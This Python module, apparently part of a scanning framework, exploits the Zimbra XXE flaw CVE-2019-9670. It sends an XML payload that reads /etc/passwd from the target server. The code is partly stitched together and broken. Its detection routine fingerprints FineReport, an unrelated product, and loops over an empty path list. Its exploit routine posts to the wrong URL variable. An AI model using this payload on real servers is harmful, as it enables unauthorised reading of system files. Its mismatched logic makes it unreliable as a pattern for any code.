# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 2:18
import socket
from _ssl import SSLCertVerificationError

from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.asynchttp import *

class Script(BaseScript):
    def __init__(self, target, pbar, semaphore):
        super().__init__()
        self.bugNumber = 'CVE-2019-9670'
        self.target = target
        self.type = BugType.XXE
        self.level = BugLevel.HIGH
        self.semaphore = semaphore
        self.bugRefer = ''
        self.detectPathList = []
        self.payloadList = '''<!DOCTYPE xxe [
                    <!ELEMENT name ANY >
                    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                     <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                        <Request>
                          <EMailAddress>aaaaa</EMailAddress>
                          <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
                        </Request>
                      </Autodiscover>'''

    async def detect(self):
        try:
            async with self.semaphore:
                with timeout(15):
                    async with aiohttp.ClientSession(headers=self.headers) as session:
                        for detectPath in self.detectPathList:
                            url = f'http://{self.target}{detectPath}' if self.target.startswith(
                                ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                            text = await AsyncFetcher.fetch(session=session, url=url)
                            if 'FineReport--Web Reporting Tool' in text:  # base on @ske 's exploit
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                                return {'name': 'FineReport Finger', 'url': url, 'software': 'FineReport < 10'}
                            if '/com/fr/web/ui/fineui.min.js' in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('FineReport', url))
                                return {'name': 'FineReport Finger', 'url': url, 'software': 'FineReport 10'}
        except TimeoutError:
            return None
        except SSLCertVerificationError:
            return None
        except socket.gaierror:
            return None
        except Exception:
            return None

    async def exploit(self):
        await self.get_url()
        if self.base_url is not None:
            _data = """<!DOCTYPE xxe [
                    <!ELEMENT name ANY >
                    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                     <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
                        <Request>
                          <EMailAddress>aaaaa</EMailAddress>
                          <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
                        </Request>
                      </Autodiscover>"""
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            async with aiohttp.ClientSession() as session:
                for path in path_list:
                    url = path + "/Autodiscover/Autodiscover.xml"
                    async with session.post(url=self.url, data=_data) as res:
                        if res!=None:
                            text = await res.text()
                            if 'Error 503 Requested response schema not available'in text:
                                self.flag = 1
                                self.res.append({"info": url, "key":"zimbra xxe"})
                                break

    async def attack(self):
        a = await self.detect()
        if a is not None:
            self.vulList.append(a)
        if self.flag:
            b = await self.exploit()
            if b is not None:
                self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList